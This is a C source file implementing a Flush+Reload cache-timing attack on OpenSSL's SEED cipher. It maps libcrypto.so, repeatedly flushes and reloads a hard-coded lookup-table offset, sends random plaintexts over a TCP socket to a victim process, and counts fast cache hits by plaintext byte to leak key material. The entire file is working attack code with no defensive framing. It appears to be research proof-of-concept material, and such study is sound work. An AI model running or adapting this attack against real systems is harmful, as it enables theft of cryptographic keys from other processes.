#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <arpa/inet.h>
#include <stdint.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <map>
#include <vector>
#include "./cacheutils.h"
# ifdef _WIN32
#  include <memory.h>
# endif
#include <openssl/seed.h>


#define Threshold (220)

#define NUMBER_OF_ENCRYPTIONS (7000000)

char* base;
char* end;

int main()
{
  int fd = open("/usr/local/lib/libcrypto.so", O_RDONLY);
  size_t size = lseek(fd, 0, SEEK_END);
  if (size == 0)
    exit(-1);
  size_t map_size = size;
  if (map_size & 0xFFF != 0)
  {
    map_size |= 0xFFF;
    map_size += 1;
  }
  base = (char*) mmap(0, map_size, PROT_READ, MAP_SHARED, fd, 0);
  end = base + size;

  int cachehit[16][256];

  for (int i=0; i<16; i++) {

    for (int j=0; j<256; j++) {

      cachehit[i][j] = 0;

    }
  }

  char* offset[] = {

base + 0x205dc0

  };

  unsigned char plaintext[16];

  int listenfd = 0,connfd = 0;

  struct sockaddr_in serv_addr;

 unsigned  char  recvBuff[16];

 int numrv;

  listenfd = socket(AF_INET, SOCK_STREAM, 0);

  printf("socket is successful\n");

  memset(&serv_addr, '0', sizeof(serv_addr));


  serv_addr.sin_family = AF_INET;
  serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
  serv_addr.sin_port = htons(5000);

  bind(listenfd, (struct sockaddr*)&serv_addr,sizeof(serv_addr));

  if(listen(listenfd, 10) == -1){

      printf("Failed to listen\n");

      return -1;
  }
      connfd = accept(listenfd, (struct sockaddr*)NULL ,NULL);

    for(size_t k=0; k < NUMBER_OF_ENCRYPTIONS ;k++){

    for (size_t l = 0; l < 4; ++l)
    {

        sched_yield();

  flush(offset[0]+(64*l));

        sched_yield();

        for (size_t j = 0; j < 16; ++j)

          plaintext[j] = rand() % 256;

        sched_yield();

  write(connfd, plaintext, sizeof(plaintext));

  read(connfd, recvBuff, sizeof(recvBuff));

    size_t time1 = rdtsc();

    maccess(offset[0]+64*l);

    size_t time2 = rdtsc() - time1;

    sched_yield();

    if (time2 < Threshold) {

          for (size_t m=0;  m < 64; ++m){

      cachehit[0][plaintext[0]^plaintext[4]^(64 * l + m)]++;

    }
  }
}

}

    sched_yield();

    for (size_t f = 0; f < 256; ++f)

     printf("%x,", cachehit[0][f]);

printf("\n");

sched_yield();

return 0;
}
